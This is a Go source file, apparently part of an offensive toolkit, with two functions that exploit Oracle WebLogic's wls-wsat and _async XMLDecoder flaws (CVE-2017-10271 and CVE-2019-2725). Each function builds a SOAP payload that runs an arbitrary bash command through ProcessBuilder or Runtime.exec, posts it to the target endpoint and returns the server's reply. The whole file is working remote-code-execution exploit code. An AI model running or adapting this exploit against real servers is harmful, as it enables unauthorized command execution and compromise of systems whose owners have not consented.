package weblogic

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"time"
)

// CVE-2017-10271 / CVE-2019-2725: wls-wsat SOAP XMLDecoder RCE
// No T3 JVMID callback needed - works over HTTP
func ExploitWlsWSAT(baseURL, cmd string) (string, error) {
	// Build XML payload that executes command
	xml := fmt.Sprintf(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0"><string>/bin/bash</string></void>
<void index="1"><string>-c</string></void>
<void index="2"><string>%s</string></void>
</array>
<void method="start"/></void></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>`, cmd)

	tr := &http.Transport{Proxy: nil}
	c := &http.Client{Timeout: 10 * time.Second, Transport: pickTransport(tr)}
	req, _ := http.NewRequest("POST", baseURL+"/wls-wsat/CoordinatorPortType", bytes.NewBufferString(xml))
	req.Header.Set("Content-Type", "text/xml")
	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(body)), nil
}

// CVE-2019-2725: wls-wsat with _async
func ExploitWlsWSAT2725(baseURL, cmd string) (string, error) {
	xml := fmt.Sprintf(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><void class="java.lang.Runtime" method="exec"><string>/bin/bash</string><string>-c</string><string>%s</string></void></java>
</work:WorkContext></soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>`, cmd)

	tr := &http.Transport{Proxy: nil}
	c := &http.Client{Timeout: 10 * time.Second, Transport: pickTransport(tr)}
	req, _ := http.NewRequest("POST", baseURL+"/_async/AsyncResponseService", bytes.NewBufferString(xml))
	req.Header.Set("Content-Type", "text/xml")
	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(body)), nil
}
